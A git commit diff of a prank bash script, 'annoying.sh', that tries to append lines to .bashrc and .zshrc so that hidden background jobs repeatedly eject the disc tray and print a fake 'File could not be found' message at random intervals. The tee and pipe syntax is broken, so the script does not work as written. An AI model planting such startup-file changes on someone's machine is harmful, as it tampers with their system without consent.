b8bb96c562582dc117fc39d5410977e1193d3cef
Author Name <13253042+johanbook@users.noreply.github.com>
2019-10-02 20:11:13 +0200

    Update annoying.sh

--- annoying.sh
+++ annoying.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-tee -a 'nohup watch -n $RANDOM eject -T &>/dev/null &' | .bashrc
+tee -a 'nohup watch -n $RANDOM eject -T &>/dev/null &' | .bashrc .zshrc
+tee -a 'watch -n $RANDOM echo "File could not be found" &>/dev/null &' | .bashrc .zshrc
